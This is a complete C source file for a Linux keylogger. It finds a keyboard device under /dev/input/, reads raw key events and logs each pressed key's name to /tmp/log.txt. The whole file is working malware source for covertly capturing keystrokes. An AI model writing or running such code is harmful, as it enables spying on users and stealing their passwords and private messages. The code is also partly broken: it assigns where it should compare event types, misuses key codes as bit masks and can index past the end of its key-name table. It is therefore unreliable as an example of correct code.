#include <stdio.h>
#include <stdlib.h>
#include <linux/input.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>


#define DIRP "/dev/input/"
#define LOG_FILE "/tmp/log.txt"


int loop = 1;

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

void sighandler(int sig){
	loop = 0;
}

char *get_input_file(void){
	struct dirent **namelist;
	char *keyboard_file = NULL;
	int num;
	
	if ((num=scandir(DIRP, &namelist, NULL, alphasort)) < 0){
		return NULL;
	}else{
		for(int i = 0;i < num;i++){
			char filename[256];
			int fd,  event_bitmap = 0;
			int32_t kbd_bitmap = KEY_A | KEY_B | KEY_C | KEY_D;
	
			snprintf(filename, 256, "%s%s", DIRP, namelist[i]->d_name);
			
			if ((fd=open(filename, O_RDONLY)) < 0){
				continue;
			}

			ioctl(fd, EVIOCGBIT(EV_KEY, sizeof(event_bitmap)), &event_bitmap);
			
			if ((kbd_bitmap & event_bitmap) == kbd_bitmap){
				keyboard_file = strdup(filename);
				close(fd);
				break;
			}
			close(fd);
		}
		
		for(int i = 0;i < num;i++){
			free(namelist[i]);
		}

		free(namelist);
	}
	return keyboard_file;
}

void write_into_file(int fd,int keyboard,const char *str){
	int written = write(fd, str, strlen(str));
	if (written < 0){
		perror("\nwrite..");
		close(fd);
		close(keyboard);
		exit(1);
	}
}

void keylogger(int fd, int output){
	struct input_event event;
	
	while(loop){
		read(fd, &event, sizeof(struct input_event));
		
		if (event.type = EV_KEY){
			if (event.value == 1){
				write_into_file(output, fd, keycodes[event.code]);
			}
		}
	}
}


int main(int argc, char **argv){
	const char *KEYBOARD_FILE = get_input_file();
	int keyboard, output;
	
	if (!KEYBOARD_FILE){
		fprintf(stderr, "No input file found on the device :[ \n");
		exit(1);
	}

	signal(SIGINT, sighandler);
	
	if ((keyboard=open(KEYBOARD_FILE, O_RDONLY)) < 0){
		fprintf(stderr, "%s: %s\n", KEYBOARD_FILE, strerror(errno));
		exit(1);
	}
	
	if ((output=open(LOG_FILE, O_WRONLY|O_CREAT|O_TRUNC|O_APPEND, S_IRUSR)) < 0){
		fprintf(stderr, "%s : %s \n", LOG_FILE, strerror(errno));
		exit(1);
	}

	keylogger(keyboard, output);

	free((void *)KEYBOARD_FILE);
	return 0;
}
